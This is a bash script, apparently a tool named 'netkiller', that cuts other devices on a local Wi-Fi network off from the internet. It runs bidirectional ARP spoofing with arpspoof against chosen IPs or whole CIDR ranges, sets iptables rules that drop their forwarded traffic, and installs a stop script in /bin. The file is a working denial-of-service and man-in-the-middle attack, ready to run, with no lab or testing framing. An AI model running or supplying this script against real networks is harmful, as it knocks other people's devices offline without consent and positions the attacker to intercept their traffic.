#!/bin/bash

# Function to validate IP address
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        for octet in "${octets[@]}"; do
            if ((octet < 0 || octet > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

# Function to expand CIDR to individual IPs
expand_cidr() {
    local cidr=$1
    local device_ip=$2
    local ips=()

    # Get network range using ipcalc
    local network_info=$(ipcalc -n "$cidr")
    local broadcast_info=$(ipcalc -b "$cidr")

    local network=$(echo "$network_info" | grep -oP 'Network:\s+\K[0-9.]+')
    local broadcast=$(echo "$broadcast_info" | grep -oP 'Broadcast:\s+\K[0-9.]+')

    IFS='.' read -r -a net_octets <<< "$network"
    IFS='.' read -r -a bcast_octets <<< "$broadcast"

    for ((a=${net_octets[0]}; a<=${bcast_octets[0]}; a++)); do
        for ((b=${net_octets[1]}; b<=${bcast_octets[1]}; b++)); do
            for ((c=${net_octets[2]}; c<=${bcast_octets[2]}; c++)); do
                for ((d=${net_octets[3]}; d<=${bcast_octets[3]}; d++)); do
                    ip="$a.$b.$c.$d"
                    # Skip network and broadcast addresses
                    if [[ "$ip" != "$network" && "$ip" != "$broadcast" ]]; then
                        # Skip device IP
                        if [[ "$ip" != "$device_ip" ]]; then
                            ips+=("$ip")
                        fi
                    fi
                done
            done
        done
    done

    echo "${ips[@]}"
}

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    echo "Please re-run using: sudo $0 $*"
    exit 1
fi

# Check for required tools
REQUIRED_TOOLS=("dsniff" "iptables" "ipcalc")

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo "$tool is required but not installed. Please install it."
        exit 1
    fi
done

# Detect network
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
MYIP=$(ip addr show $WLAN | awk '/inet / {print $2}' | cut -d/ -f1)

echo ""
echo "Current Network Information"
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "DEVICE IP: | $MYIP"
echo ""

# Get user input
echo "Enter network interface (e.g., $WLAN): Enter to skip"
read -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

echo "Enter the Gateway IP: Enter to skip"
read -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

echo "Enter Device IP: $MYIP"
DEVICE_IP="$MYIP"
echo ""

echo "Enter target IP (e.g 10.0.0.10 10.0.0.20 or 10.0.0.1/20)"
read -p "> " TARGET_INPUT
echo ""

echo "Target Device IP"
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $DEVICE_IP"
echo "TARGET:    | $TARGET_INPUT"
echo ""

# Validate gateway and device IP
if ! validate_ip "$GATEWAY"; then
    echo "Invalid gateway IP"
    exit 1
fi

if ! validate_ip "$DEVICE_IP"; then
    echo "Invalid device IP"
    exit 1
fi

# Process target input
TARGETS=()
for input in $TARGET_INPUT; do
    if [[ $input == *"/"* ]]; then
        # CIDR notation - expand it
        expanded_ips=$(expand_cidr "$input" "$DEVICE_IP")
        if [ -z "$expanded_ips" ]; then
            echo "No valid IPs found in CIDR range $input (after skipping device IP)"
        else
            TARGETS+=($expanded_ips)
        fi
    else
        # Single IP
        if validate_ip "$input"; then
            if [[ "$input" != "$DEVICE_IP" ]]; then
                TARGETS+=("$input")
            else
                echo "Skipping device IP $input"
            fi
        else
            echo "Invalid IP address: $input"
        fi
    fi
done

if [ ${#TARGETS[@]} -eq 0 ]; then
    echo "No valid target IPs provided"
    exit 1
fi

echo "Target IPs to block: ${TARGETS[@]}"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Block all of the target packets for each target
for TARGET in "${TARGETS[@]}"; do
    echo "Blocking $TARGET..."

        sudo iptables -P FORWARD DROP
        sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
        sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
        sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
        sudo iptables -A FORWARD -s "$TARGET" -j DROP
        sudo iptables -A FORWARD -d "$TARGET" -j DROP
        
       # Bidirectional ARP Spoofing
        sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
done

echo ""
echo "Blocking rules applied."

# Cleanup function
cat > /bin/netkiller-stop << EOF
#!/bin/bash
echo "Unblocking the Device..."
    # Kill all arpspoof processes
    sudo pkill arpspoof
    # Flush iptables rules
    sudo iptables -F FORWARD
    sudo iptables -t nat -F
sleep 2s
echo "Done!"
EOF
chmod 755 /bin/netkiller-stop

echo ""
echo "Netkiller is running in the Background!"
echo "To stop, run: sudo netkiller-stop"
